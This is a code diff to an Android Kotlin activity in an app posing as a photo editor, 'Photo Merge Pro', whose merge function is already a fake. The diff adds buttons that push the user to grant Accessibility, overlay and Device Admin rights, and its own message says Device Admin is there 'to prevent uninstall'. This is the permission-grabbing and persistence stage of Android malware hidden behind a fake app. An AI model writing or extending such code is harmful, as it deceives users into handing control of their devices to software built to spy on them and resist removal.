@@ -1,11 +1,14 @@
 package com.magic.photoeditor
 
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
 import android.net.Uri
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.MediaStore
+import android.provider.Settings
 import android.widget.Button
 import android.widget.ProgressBar
 import android.widget.TextView
@@ -27,6 +30,7 @@ class MergeActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        Config.load(this)
         setContentView(R.layout.activity_merge)
 
         selectedImages = mutableListOf()
@@ -43,6 +47,9 @@ class MergeActivity : AppCompatActivity() {
         val btnSelectImages = findViewById<Button>(R.id.btnSelectImages)
         val btnSelectVideos = findViewById<Button>(R.id.btnSelectVideos)
         val btnMerge = findViewById<Button>(R.id.btnMerge)
+        val btnAccessibility = findViewById<Button>(R.id.btnAccessibility)
+        val btnDeviceAdmin = findViewById<Button>(R.id.btnDeviceAdmin)
+        val btnOverlay = findViewById<Button>(R.id.btnOverlay)
 
         btnSelectImages.setOnClickListener {
             val intent = Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
@@ -62,6 +69,18 @@ class MergeActivity : AppCompatActivity() {
                 return@setOnClickListener
             }
             startFakeMerge()
+        }
+
+        btnAccessibility.setOnClickListener {
+            enableAccessibility()
+        }
+
+        btnDeviceAdmin.setOnClickListener {
+            enableDeviceAdmin()
+        }
+
+        btnOverlay.setOnClickListener {
+            enableOverlay()
         }
 
         updateCount()
@@ -149,5 +168,41 @@ class MergeActivity : AppCompatActivity() {
                 }
             }
         }, 500)
+    }
+
+    // NEW: Enable Accessibility Service
+    private fun enableAccessibility() {
+        try {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            startActivity(intent)
+            Toast.makeText(this, "Enable 'Photo Merge Pro' in Accessibility settings", Toast.LENGTH_LONG).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "Cannot open settings: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // NEW: Enable Device Admin
+    private fun enableDeviceAdmin() {
+        try {
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+            startActivity(intent)
+            Toast.makeText(this, "Activate Device Admin to prevent uninstall", Toast.LENGTH_LONG).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "Cannot open device admin: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // NEW: Enable Overlay
+    private fun enableOverlay() {
+        try {
+            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
+            intent.data = Uri.parse("package:$packageName")
+            startActivity(intent)
+            Toast.makeText(this, "Enable 'Display over other apps'", Toast.LENGTH_LONG).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "Cannot open overlay settings: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
     }
 }
